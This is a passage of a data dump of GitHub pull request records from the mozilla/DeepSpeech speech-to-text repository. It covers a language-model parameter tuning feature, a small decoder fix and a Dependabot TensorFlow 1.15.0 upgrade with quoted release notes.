  * ""FINE"" scan `alpha` linespace in center = `last best alpha` width = `(--finetune_lm_alpha_max - --finetune_lm_alpha_min) / 2.0` (`beta` = `best beta`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`, if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * use `best alpha` & `best beta` to do test() again, then compare with original one
  * export a report json file to `--finetune_output_file`

This finetune option could cost 3.x consuming of test epoch (`original test` + `finetune test` + `scanning` )

usage:
```
python -u DeepSpeech.py --test_files data/test.csv \
    --finetune_lm_csv_files data/test.csv \
    --finetune_lm_sampling_size 256 \
    --finetune_output_file data/lm/finetune.json
```
output report, I use the official model to test on voxforge test data, to generate the report, you must specify the `--test_files` and `--finetune_output_file`:
```
{
    ""origin_test_result"": {
        ""alpha"": 0.75,
        ""beta"": 1.85,
        ""samples_wer"": 0.19957946381636588,
        ""samples_cer"": 0.1047226538747382
    },
    ""finetune_test_result"": {
        ""alpha"": 0.9464133991551923,
        ""beta"": 2.0,
        ""samples_wer"": 0.19852812335728054,
        ""samples_cer"": 0.10810080399972975
    },
    ""finetune_parameters"": {
        ""sample_size"": 256,
        ""alpha_min"": 0.5,
        ""alpha_max"": 1.5,
        ""alpha_steps"": 7,
        ""beta_min"": 1.0,
        ""beta_max"": 2.0,
        ""beta_steps"": 5,
        ""csv_files"": ""data/test.csv""
    }
}
```

### Other modification
----
* fix evaluate.py missing `import sys`
* return samples from test() for comparing results
* remove `test_csvs = FLAGS.test_files.split(',')` in `evaluate(test_csvs, create_model, try_loading)` function, this line overwrite the input argument `test_csvs`
",mychiux413,13641193,2019-12-18T04:34:35Z,CONTRIBUTOR,False,437,13,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f3b11e1e73b2ed41cdd90944e29bffcaf5599213,"[MOD] move finetune functions into finetune_lm_params.py, refactor evaluate()'s input arguments [ADD] allow finetune algorithms to be added, add random_search"
1584,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2609,2609,Finetune lm parameters by fitting parabola curve,"This is an option for tuning language model parameters: `alpha`, `beta` by fitting parabola curve , then report a json file to compare the different wer between: `oringal lm params` v.s. `finetuned lm params`

Due to time-consuming issue, this tool doesn't use grid search to iterate the whole datasets, but use `parabola fitting` ([paddle-deepspeech-grid-search](https://github.com/PaddlePaddle/DeepSpeech/blob/develop/docs/images/tuning_error_surface.png)) and just iterate `sampling data` to fast get good performance.

Fitting Process Step by Step:
  * samping the specified csv file: `--finetune_lm_csv_files` with sampling size = ` --finetune_lm_sampling_size` 
  * scan `alpha` linespace from `--finetune_lm_alpha_min` to `--finetune_lm_alpha_min` with steps `--finetune_lm_alpha_steps` (set `beta` = `--lm_alpha`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`(the bottom of valley), if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * scan `beta` linespace from `--finetune_lm_beta_min` to `--finetune_lm_beta_min` (`alpha` = `best alpha`)
  * fitting valley parabola curve  on `wer v.s. beta`, finding `best beta`, if not an idea valley parabola, just pick the lowest wer from scanning points. (in fact, most of time, beta is not valley parabola curve, and wer hardly changed)
  * ""FINE"" scan `alpha` linespace in center = `last best alpha` width = `(--finetune_lm_alpha_max - --finetune_lm_alpha_min) / 2.0` (`beta` = `best beta`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`, if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * use `best alpha` & `best beta` to do test() again, then compare with original one
  * export a report json file to `--finetune_output_file`

This finetune option could cost 3.x consuming of test epoch (`original test` + `finetune test` + `scanning` )

usage:
```
python -u DeepSpeech.py --test_files data/test.csv \
    --finetune_lm_csv_files data/test.csv \
    --finetune_lm_sampling_size 256 \
    --finetune_output_file data/lm/finetune.json
```
output report, I use the official model to test on voxforge test data, to generate the report, you must specify the `--test_files` and `--finetune_output_file`:
```
{
    ""origin_test_result"": {
        ""alpha"": 0.75,
        ""beta"": 1.85,
        ""samples_wer"": 0.19957946381636588,
        ""samples_cer"": 0.1047226538747382
    },
    ""finetune_test_result"": {
        ""alpha"": 0.9464133991551923,
        ""beta"": 2.0,
        ""samples_wer"": 0.19852812335728054,
        ""samples_cer"": 0.10810080399972975
    },
    ""finetune_parameters"": {
        ""sample_size"": 256,
        ""alpha_min"": 0.5,
        ""alpha_max"": 1.5,
        ""alpha_steps"": 7,
        ""beta_min"": 1.0,
        ""beta_max"": 2.0,
        ""beta_steps"": 5,
        ""csv_files"": ""data/test.csv""
    }
}
```

### Other modification
----
* fix evaluate.py missing `import sys`
* return samples from test() for comparing results
* remove `test_csvs = FLAGS.test_files.split(',')` in `evaluate(test_csvs, create_model, try_loading)` function, this line overwrite the input argument `test_csvs`
",mychiux413,13641193,2019-12-18T04:34:35Z,CONTRIBUTOR,False,437,13,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,db181a28c465be9345fa973d5e7348b41fb2943e,[FIX] pylint error [MOD] rewrite parabola document
1585,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2609,2609,Finetune lm parameters by fitting parabola curve,"This is an option for tuning language model parameters: `alpha`, `beta` by fitting parabola curve , then report a json file to compare the different wer between: `oringal lm params` v.s. `finetuned lm params`

Due to time-consuming issue, this tool doesn't use grid search to iterate the whole datasets, but use `parabola fitting` ([paddle-deepspeech-grid-search](https://github.com/PaddlePaddle/DeepSpeech/blob/develop/docs/images/tuning_error_surface.png)) and just iterate `sampling data` to fast get good performance.

Fitting Process Step by Step:
  * samping the specified csv file: `--finetune_lm_csv_files` with sampling size = ` --finetune_lm_sampling_size` 
  * scan `alpha` linespace from `--finetune_lm_alpha_min` to `--finetune_lm_alpha_min` with steps `--finetune_lm_alpha_steps` (set `beta` = `--lm_alpha`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`(the bottom of valley), if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * scan `beta` linespace from `--finetune_lm_beta_min` to `--finetune_lm_beta_min` (`alpha` = `best alpha`)
  * fitting valley parabola curve  on `wer v.s. beta`, finding `best beta`, if not an idea valley parabola, just pick the lowest wer from scanning points. (in fact, most of time, beta is not valley parabola curve, and wer hardly changed)
  * ""FINE"" scan `alpha` linespace in center = `last best alpha` width = `(--finetune_lm_alpha_max - --finetune_lm_alpha_min) / 2.0` (`beta` = `best beta`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`, if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * use `best alpha` & `best beta` to do test() again, then compare with original one
  * export a report json file to `--finetune_output_file`

This finetune option could cost 3.x consuming of test epoch (`original test` + `finetune test` + `scanning` )

usage:
```
python -u DeepSpeech.py --test_files data/test.csv \
    --finetune_lm_csv_files data/test.csv \
    --finetune_lm_sampling_size 256 \
    --finetune_output_file data/lm/finetune.json
```
output report, I use the official model to test on voxforge test data, to generate the report, you must specify the `--test_files` and `--finetune_output_file`:
```
{
    ""origin_test_result"": {
        ""alpha"": 0.75,
        ""beta"": 1.85,
        ""samples_wer"": 0.19957946381636588,
        ""samples_cer"": 0.1047226538747382
    },
    ""finetune_test_result"": {
        ""alpha"": 0.9464133991551923,
        ""beta"": 2.0,
        ""samples_wer"": 0.19852812335728054,
        ""samples_cer"": 0.10810080399972975
    },
    ""finetune_parameters"": {
        ""sample_size"": 256,
        ""alpha_min"": 0.5,
        ""alpha_max"": 1.5,
        ""alpha_steps"": 7,
        ""beta_min"": 1.0,
        ""beta_max"": 2.0,
        ""beta_steps"": 5,
        ""csv_files"": ""data/test.csv""
    }
}
```

### Other modification
----
* fix evaluate.py missing `import sys`
* return samples from test() for comparing results
* remove `test_csvs = FLAGS.test_files.split(',')` in `evaluate(test_csvs, create_model, try_loading)` function, this line overwrite the input argument `test_csvs`
",mychiux413,13641193,2019-12-18T04:34:35Z,CONTRIBUTOR,False,437,13,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4034eec06cf5bb3d004b36916ec65d8e3a66a18b,disable import-outside-toplevel
1586,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2609,2609,Finetune lm parameters by fitting parabola curve,"This is an option for tuning language model parameters: `alpha`, `beta` by fitting parabola curve , then report a json file to compare the different wer between: `oringal lm params` v.s. `finetuned lm params`

Due to time-consuming issue, this tool doesn't use grid search to iterate the whole datasets, but use `parabola fitting` ([paddle-deepspeech-grid-search](https://github.com/PaddlePaddle/DeepSpeech/blob/develop/docs/images/tuning_error_surface.png)) and just iterate `sampling data` to fast get good performance.

Fitting Process Step by Step:
  * samping the specified csv file: `--finetune_lm_csv_files` with sampling size = ` --finetune_lm_sampling_size` 
  * scan `alpha` linespace from `--finetune_lm_alpha_min` to `--finetune_lm_alpha_min` with steps `--finetune_lm_alpha_steps` (set `beta` = `--lm_alpha`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`(the bottom of valley), if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * scan `beta` linespace from `--finetune_lm_beta_min` to `--finetune_lm_beta_min` (`alpha` = `best alpha`)
  * fitting valley parabola curve  on `wer v.s. beta`, finding `best beta`, if not an idea valley parabola, just pick the lowest wer from scanning points. (in fact, most of time, beta is not valley parabola curve, and wer hardly changed)
  * ""FINE"" scan `alpha` linespace in center = `last best alpha` width = `(--finetune_lm_alpha_max - --finetune_lm_alpha_min) / 2.0` (`beta` = `best beta`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`, if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * use `best alpha` & `best beta` to do test() again, then compare with original one
  * export a report json file to `--finetune_output_file`

This finetune option could cost 3.x consuming of test epoch (`original test` + `finetune test` + `scanning` )

usage:
```
python -u DeepSpeech.py --test_files data/test.csv \
    --finetune_lm_csv_files data/test.csv \
    --finetune_lm_sampling_size 256 \
    --finetune_output_file data/lm/finetune.json
```
output report, I use the official model to test on voxforge test data, to generate the report, you must specify the `--test_files` and `--finetune_output_file`:
```
{
    ""origin_test_result"": {
        ""alpha"": 0.75,
        ""beta"": 1.85,
        ""samples_wer"": 0.19957946381636588,
        ""samples_cer"": 0.1047226538747382
    },
    ""finetune_test_result"": {
        ""alpha"": 0.9464133991551923,
        ""beta"": 2.0,
        ""samples_wer"": 0.19852812335728054,
        ""samples_cer"": 0.10810080399972975
    },
    ""finetune_parameters"": {
        ""sample_size"": 256,
        ""alpha_min"": 0.5,
        ""alpha_max"": 1.5,
        ""alpha_steps"": 7,
        ""beta_min"": 1.0,
        ""beta_max"": 2.0,
        ""beta_steps"": 5,
        ""csv_files"": ""data/test.csv""
    }
}
```

### Other modification
----
* fix evaluate.py missing `import sys`
* return samples from test() for comparing results
* remove `test_csvs = FLAGS.test_files.split(',')` in `evaluate(test_csvs, create_model, try_loading)` function, this line overwrite the input argument `test_csvs`
",mychiux413,13641193,2019-12-18T04:34:35Z,CONTRIBUTOR,False,437,13,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,059f3ba85d88ae66943ea57fc2d8049967914467,[FIX] disable=import-outside-toplevel with pylint==2.4.4
1587,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2609,2609,Finetune lm parameters by fitting parabola curve,"This is an option for tuning language model parameters: `alpha`, `beta` by fitting parabola curve , then report a json file to compare the different wer between: `oringal lm params` v.s. `finetuned lm params`

Due to time-consuming issue, this tool doesn't use grid search to iterate the whole datasets, but use `parabola fitting` ([paddle-deepspeech-grid-search](https://github.com/PaddlePaddle/DeepSpeech/blob/develop/docs/images/tuning_error_surface.png)) and just iterate `sampling data` to fast get good performance.

Fitting Process Step by Step:
  * samping the specified csv file: `--finetune_lm_csv_files` with sampling size = ` --finetune_lm_sampling_size` 
  * scan `alpha` linespace from `--finetune_lm_alpha_min` to `--finetune_lm_alpha_min` with steps `--finetune_lm_alpha_steps` (set `beta` = `--lm_alpha`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`(the bottom of valley), if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * scan `beta` linespace from `--finetune_lm_beta_min` to `--finetune_lm_beta_min` (`alpha` = `best alpha`)
  * fitting valley parabola curve  on `wer v.s. beta`, finding `best beta`, if not an idea valley parabola, just pick the lowest wer from scanning points. (in fact, most of time, beta is not valley parabola curve, and wer hardly changed)
  * ""FINE"" scan `alpha` linespace in center = `last best alpha` width = `(--finetune_lm_alpha_max - --finetune_lm_alpha_min) / 2.0` (`beta` = `best beta`)
  * fitting valley parabola curve  on `wer v.s. alpha`, finding `best alpha`, if the fitting is not an idea valley parabola, just pick the lowest wer from scanning points.
  * use `best alpha` & `best beta` to do test() again, then compare with original one
  * export a report json file to `--finetune_output_file`

This finetune option could cost 3.x consuming of test epoch (`original test` + `finetune test` + `scanning` )

usage:
```
python -u DeepSpeech.py --test_files data/test.csv \
    --finetune_lm_csv_files data/test.csv \
    --finetune_lm_sampling_size 256 \
    --finetune_output_file data/lm/finetune.json
```
output report, I use the official model to test on voxforge test data, to generate the report, you must specify the `--test_files` and `--finetune_output_file`:
```
{
    ""origin_test_result"": {
        ""alpha"": 0.75,
        ""beta"": 1.85,
        ""samples_wer"": 0.19957946381636588,
        ""samples_cer"": 0.1047226538747382
    },
    ""finetune_test_result"": {
        ""alpha"": 0.9464133991551923,
        ""beta"": 2.0,
        ""samples_wer"": 0.19852812335728054,
        ""samples_cer"": 0.10810080399972975
    },
    ""finetune_parameters"": {
        ""sample_size"": 256,
        ""alpha_min"": 0.5,
        ""alpha_max"": 1.5,
        ""alpha_steps"": 7,
        ""beta_min"": 1.0,
        ""beta_max"": 2.0,
        ""beta_steps"": 5,
        ""csv_files"": ""data/test.csv""
    }
}
```

### Other modification
----
* fix evaluate.py missing `import sys`
* return samples from test() for comparing results
* remove `test_csvs = FLAGS.test_files.split(',')` in `evaluate(test_csvs, create_model, try_loading)` function, this line overwrite the input argument `test_csvs`
",mychiux413,13641193,2019-12-18T04:34:35Z,CONTRIBUTOR,False,437,13,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,39e818839394aa28e66099f42907faffa3febcb5,add target_mean_loss info into report
1588,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2607,2607,Don't OOV_SCORE on empty prefix,Fixes #2579,lissyx,1645737,2019-12-17T08:40:47Z,COLLABORATOR,True,1,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f44d2ddeb93f759b7c14a2e9bca48e2a1e76e002,"Don't OOV_SCORE on empty prefix

Fixes #2579"
1589,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2605,2605,Bump tensorflow from 1.14.0 to 1.15.0,"Bumps [tensorflow](https://github.com/tensorflow/tensorflow) from 1.14.0 to 1.15.0.
<details>
<summary>Release notes</summary>

*Sourced from [tensorflow's releases](https://github.com/tensorflow/tensorflow/releases).*

> ## TensorFlow 1.15.0
> # Release 1.15.0
> This is the last 1.x release for TensorFlow. We do not expect to update the 1.x branch with features, although we will issue patch releases to fix vulnerabilities for at least one year.
> 
> ## Major Features and Improvements
> * As [announced](https://groups.google.com/a/tensorflow.org/forum/#!topic/developers/iRCt5m4qUz0), `tensorflow` pip package will by default include GPU support (same as `tensorflow-gpu` now) for the platforms we currently have GPU support (Linux and Windows). It will work on machines with and without Nvidia GPUs. `tensorflow-gpu` will still be available, and CPU-only packages can be downloaded at `tensorflow-cpu` for users who are concerned about package size.
> * TensorFlow 1.15 contains a complete implementation of the 2.0 API in its `compat.v2` module. It contains a copy of the 1.15 main module (without `contrib`) in the `compat.v1` module. TensorFlow 1.15 is able to emulate 2.0 behavior using the `enable_v2_behavior()` function.
> This enables writing forward compatible code: by explicitly importing either `tensorflow.compat.v1` or `tensorflow.compat.v2`, you can ensure that your code works without modifications against an installation of 1.15 or 2.0.
> * `EagerTensor` now supports numpy buffer interface for tensors.
> * Add toggles `tf.enable_control_flow_v2()` and `tf.disable_control_flow_v2()` for enabling/disabling v2 control flow.
> * Enable v2 control flow as part of `tf.enable_v2_behavior()` and `TF2_BEHAVIOR=1`.
> * AutoGraph translates Python control flow into TensorFlow expressions, allowing users to write regular Python inside `tf.function`-decorated functions. AutoGraph is also applied in functions used with `tf.data`, `tf.distribute` and `tf.keras` APIS.
> * Adds `enable_tensor_equality()`, which switches the behavior such that: 
>   * Tensors are no longer hashable.
>   * Tensors can be compared with `==` and `!=`, yielding a Boolean Tensor with element-wise comparison results. This will be the default behavior in 2.0.
> * Auto Mixed-Precision graph optimizer simplifies converting models to `float16` for acceleration on Volta and Turing Tensor Cores. This feature can be enabled by wrapping an optimizer class with `tf.train.experimental.enable_mixed_precision_graph_rewrite()`.
> * Add environment variable `TF_CUDNN_DETERMINISTIC`. Setting to ""true"" or ""1"" forces the selection of deterministic cuDNN convolution and max-pooling algorithms. When this is enabled, the algorithm selection procedure itself is also deterministic.
> * TensorRT
>   * Migrate TensorRT conversion sources from contrib to compiler directory in preparation for TF 2.0.
>   * Add additional, user friendly `TrtGraphConverter` API for TensorRT conversion.
>   * Expand support for TensorFlow operators in TensorRT conversion (e.g.
>     `Gather`, `Slice`, `Pack`, `Unpack`, `ArgMin`, `ArgMax`,`DepthSpaceShuffle`). 
>   * Support TensorFlow operator `CombinedNonMaxSuppression` in TensorRT conversion which 
>      significantly accelerates object detection models.
> 
> ## Breaking Changes
> * Tensorflow code now produces 2 different pip packages: `tensorflow_core` containing all the code (in the future it will contain only the private implementation) and `tensorflow` which is a virtual pip package doing forwarding to `tensorflow_core` (and in the future will contain only the public API of tensorflow). We don't expect this to be breaking, unless you were importing directly from the implementation.
> * TensorFlow 1.15 is built using devtoolset7 (GCC7) on Ubuntu 16. This may lead to ABI incompatibilities with extensions built against earlier versions of TensorFlow.
> * Deprecated the use of `constraint=` and `.constraint` with ResourceVariable.
> * `tf.keras`:
>   * `OMP_NUM_THREADS` is no longer used by the default Keras config. To configure the number of threads, use `tf.config.threading` APIs.
>   * `tf.keras.model.save_model` and `model.save` now defaults to saving a TensorFlow SavedModel.
>   * `keras.backend.resize_images` (and consequently, `keras.layers.Upsampling2D`) behavior has changed, a bug in the resizing implementation was fixed.
>   * Layers now default to `float32`, and automatically cast their inputs to the layer's dtype. If you had a model that used `float64`, it will probably silently use `float32` in TensorFlow2, and a warning will be issued that starts with Layer ""layer-name"" is casting an input tensor from dtype float64 to the layer's dtype of float32. To fix, either set the default dtype to float64 with `tf.keras.backend.set_floatx('float64')`, or pass `dtype='float64'` to each of the Layer constructors. See `tf.keras.layers.Layer` for more information.
>   * Some `tf.assert_*` methods now raise assertions at operation creation time (i.e. when this Python line executes) if the input tensors' values are known at that time, not during the session.run(). When this happens, a noop is returned and the input tensors are marked non-feedable. In other words, if they are used as keys in `feed_dict` argument to `session.run()`, an error will be raised. Also, because some assert ops don't make it into the graph, the graph structure changes. A different graph can result in different per-op random seeds when they are not given explicitly (most often).
> 
> ## Bug Fixes and Other Changes
> * `tf.estimator`:
>   * `tf.keras.estimator.model_to_estimator` now supports exporting to `tf.train.Checkpoint` format, which allows the saved checkpoints to be compatible with `model.load_weights`.
>   * Fix tests in canned estimators.
>   * Expose Head as public API.
>   * Fixes critical bugs that help with `DenseFeatures` usability in TF2
> * `tf.data`:
>   * Promoting `unbatch` from experimental to core API.
>   * Adding support for datasets as inputs to `from_tensors` and `from_tensor_slices` and batching and unbatching of nested datasets.
> * `tf.keras`:
>   * `tf.keras.estimator.model_to_estimator` now supports exporting to tf.train.Checkpoint format, which allows the saved checkpoints to be compatible with `model.load_weights`.
>   * Saving a Keras Model using `tf.saved_model.save` now saves the list of variables, trainable variables, regularization losses, and the call function.
>   * Deprecated `tf.keras.experimental.export_saved_model` and `tf.keras.experimental.function`. Please use `tf.keras.models.save_model(..., save_format='tf')` and `tf.keras.models.load_model` instead.
>   * Add an `implementation=3` mode for `tf.keras.layers.LocallyConnected2D` and `tf.keras.layers.LocallyConnected1D` layers using `tf.SparseTensor` to store weights,  allowing a dramatic speedup for large sparse models.
></tr></table> ... (truncated)
</details>
<details>
<summary>Changelog</summary>

*Sourced from [tensorflow's changelog](https://github.com/tensorflow/tensorflow/blob/master/RELEASE.md).*

> # Release 1.15.0
> This is the last 1.x release for TensorFlow. We do not expect to update the 1.x branch with features, although we will issue patch releases to fix vulnerabilities for at least one year. 
> 
> ## Major Features and Improvements
> * As [announced](https://groups.google.com/a/tensorflow.org/forum/#!topic/developers/iRCt5m4qUz0), `tensorflow` pip package will by default include GPU support (same as `tensorflow-gpu` now) for the platforms we currently have GPU support (Linux and Windows). It will work on machines with and without Nvidia GPUs. `tensorflow-gpu` will still be available, and CPU-only packages can be downloaded at `tensorflow-cpu` for users who are concerned about package size.
> * TensorFlow 1.15 contains a complete implementation of the 2.0 API in its `compat.v2` module. It contains a copy of the 1.15 main module (without `contrib`) in the `compat.v1` module. TensorFlow 1.15 is able to emulate 2.0 behavior using the `enable_v2_behavior()` function.
> This enables writing forward compatible code: by explicitly importing either `tensorflow.compat.v1` or `tensorflow.compat.v2`, you can ensure that your code works without modifications against an installation of 1.15 or 2.0.
> * EagerTensor now supports numpy buffer interface for tensors.
> * Add toggles `tf.enable_control_flow_v2()` and `tf.disable_control_flow_v2()` for enabling/disabling v2 control flow.
> * Enable v2 control flow as part of `tf.enable_v2_behavior()` and `TF2_BEHAVIOR=1`.
> * AutoGraph translates Python control flow into TensorFlow expressions, allowing users to write regular Python inside `tf.function`-decorated functions. AutoGraph is also applied in functions used with `tf.data`, `tf.distribute` and `tf.keras` APIS.
> * Adds `enable_tensor_equality()`, which switches the behavior such that: 
>   * Tensors are no longer hashable.
>   * Tensors can be compared with `==` and `!=`, yielding a Boolean Tensor with element-wise comparison results. This will be the default behavior in 2.0.
> 
> ## Breaking Changes
> * Tensorflow code now produces 2 different pip packages: `tensorflow_core` containing all the code (in the future it will contain only the private implementation) and `tensorflow` which is a virtual pip package doing forwarding to `tensorflow_core` (and in the future will contain only the public API of tensorflow). We don't expect this to be breaking, unless you were importing directly from the implementation.
> * TensorFlow 1.15 is built using devtoolset7 (GCC7) on Ubuntu 16. This may lead to ABI incompatibilities with extensions built against earlier versions of TensorFlow.
> * Deprecated the use of `constraint=` and `.constraint` with ResourceVariable.
> * `tf.keras`:
>   * `OMP_NUM_THREADS` is no longer used by the default Keras config. To configure the number of threads, use `tf.config.threading` APIs.
>   * `tf.keras.model.save_model` and `model.save` now defaults to saving a TensorFlow SavedModel.
>   * `keras.backend.resize_images` (and consequently, `keras.layers.Upsampling2D`) behavior has changed, a bug in the resizing implementation was fixed.
>   * Layers now default to `float32`, and automatically cast their inputs to the layer's dtype. If you had a model that used `float64`, it will probably silently use `float32` in TensorFlow2, and a warning will be issued that starts with Layer ""layer-name"" is casting an input tensor from dtype float64 to the layer's dtype of float32. To fix, either set the default dtype to float64 with `tf.keras.backend.set_floatx('float64')`, or pass `dtype='float64'` to each of the Layer constructors. See `tf.keras.layers.Layer` for more information.
>   * Some `tf.assert_*` methods now raise assertions at operation creation time (i.e. when this Python line executes) if the input tensors' values are known at that time, not during the session.run(). When this happens, a noop is returned and the input tensors are marked non-feedable. In other words, if they are used as keys in `feed_dict` argument to `session.run()`, an error will be raised. Also, because some assert ops don't make it into the graph, the graph structure changes. A different graph can result in different per-op random seeds when they are not given explicitly (most often).
> 
> ## Bug Fixes and Other Changes
> * `tf.estimator`:
>   * `tf.keras.estimator.model_to_estimator` now supports exporting to `tf.train.Checkpoint` format, which allows the saved checkpoints to be compatible with `model.load_weights`.
>   * Fix tests in canned estimators.
>   * Expose Head as public API.
>   * Fixes critical bugs that help with `DenseFeatures` usability in TF2
> * `tf.data`:
>   * Promoting `unbatch` from experimental to core API.
>   * Adding support for datasets as inputs to `from_tensors` and `from_tensor_slices` and batching and unbatching of nested datasets.
> * `tf.keras`:
>   * `tf.keras.estimator.model_to_estimator` now supports exporting to tf.train.Checkpoint format, which allows the saved checkpoints to be compatible with `model.load_weights`.
>   * Saving a Keras Model using `tf.saved_model.save` now saves the list of variables, trainable variables, regularization losses, and the call function.
>   * Deprecated `tf.keras.experimental.export_saved_model` and `tf.keras.experimental.function`. Please use `tf.keras.models.save_model(..., save_format='tf')` and `tf.keras.models.load_model` instead.
>   * Add an `implementation=3` mode for `tf.keras.layers.LocallyConnected2D` and `tf.keras.layers.LocallyConnected1D` layers using `tf.SparseTensor` to store weights,  allowing a dramatic speedup for large sparse models.
>   * Enable the Keras compile API `experimental_run_tf_function` flag by default. This flag enables single training/eval/predict execution path. With this 1. All input types are converted to `Dataset`. 2. When distribution strategy is not specified this goes through the no-op distribution strategy path. 3. Execution is wrapped in tf.function unless `run_eagerly=True` is set in compile.
>   * Raise error if `batch_size` argument is used when input is dataset/generator/keras sequence.
> * `tf.lite`
>   * Add `GATHER` support to NN API delegate.
>   * tflite object detection script has a debug mode.
>   * Add delegate support for `QUANTIZE`.
>   * Added evaluation script for COCO minival.
>   * Add delegate support for `QUANTIZED_16BIT_LSTM`.
>   * Converts hardswish subgraphs into atomic ops.
> * Add support for defaulting the value of `cycle_length` argument of `tf.data.Dataset.interleave` to the number of schedulable CPU cores.
></tr></table> ... (truncated)
</details>
<details>
<summary>Commits</summary>

- [`590d6ee`](https://github.com/tensorflow/tensorflow/commit/590d6eef7e91a6a7392c8ffffb7b58f2e0c8bc6b) Merge pull request [#31861](https://github-redirect.dependabot.com/tensorflow/tensorflow/issues/31861) from tensorflow-jenkins/relnotes-1.15.0rc0-16184
- [`b27ac43`](https://github.com/tensorflow/tensorflow/commit/b27ac431aa37cfeb9d5c35cc50081cdb6763a40e) Update RELEASE.md
- [`07bf663`](https://github.com/tensorflow/tensorflow/commit/07bf6634f602757ef0b2106a92c519d09e80157e) Merge pull request [#33213](https://github-redirect.dependabot.com/tensorflow/tensorflow/issues/33213) from Intel-tensorflow/mkl-dnn-0.20.6
- [`46f50ff`](https://github.com/tensorflow/tensorflow/commit/46f50ff8a0f099269ac29573bc6ac09d1bc6cab7) Merge pull request [#33262](https://github-redirect.dependabot.com/tensorflow/tensorflow/issues/33262) from tensorflow/ggadde-1-15-cp2
- [`49c154e`](https://github.com/tensorflow/tensorflow/commit/49c154e17e9fdfe008f8b0b929d1a729e5939c51) Merge pull request [#33263](https://github-redirect.dependabot.com/tensorflow/tensorflow/issues/33263) from tensorflow/ggadde-1-15-final-version
- [`a16adeb`](https://github.com/tensorflow/tensorflow/commit/a16adeb793b587a08958a72cbbf0d338e063a042) Update TensorFlow version to 1.15.0 in preparation for final relase.
- [`8d71a87`](https://github.com/tensorflow/tensorflow/commit/8d71a87b0e3de6d07588f9139660a77271d12498) Add saving of loaded/trained compatibility models in test and fix a compatibi...
- [`8c48aff`](https://github.com/tensorflow/tensorflow/commit/8c48affdf8ec0e5a9c5252f88e63aa5b97daf239) [Intel Mkl] Upgrading MKL-DNN to 0.20.6 to fix SGEMM regression
- [`38ea9bb`](https://github.com/tensorflow/tensorflow/commit/38ea9bbfea423eb968fcc70bc454471277c9537c) Merge pull request [#33120](https://github-redirect.dependabot.com/tensorflow/tensorflow/issues/33120) from tensorflow/perf
- [`a8ef0f5`](https://github.com/tensorflow/tensorflow/commit/a8ef0f5d3bff3fe6f46b821832a4e9073dd7c01d) Automated rollback of commit db7e43192d405973c6c50f6e60e831a198bb4a49
- Additional commits viewable in [compare view](https://github.com/tensorflow/tensorflow/compare/v1.14.0...v1.15.0)
</details>
<br />

[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=tensorflow&package-manager=pip&previous-version=1.14.0&new-version=1.15.0)](https://help.github.com/articles/configuring-automated-security-fixes)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot ignore this [patch|minor|major] version` will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language

You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/mozilla/DeepSpeech/network/alerts).

</details>",dependabot[bot],49699333,2019-12-16T20:47:07Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f3706004867c930487ffa28659e7b4596ccc2317,"Bump tensorflow from 1.14.0 to 1.15.0

Bumps [tensorflow](https://github.com/tensorflow/tensorflow) from 1.14.0 to 1.15.0.
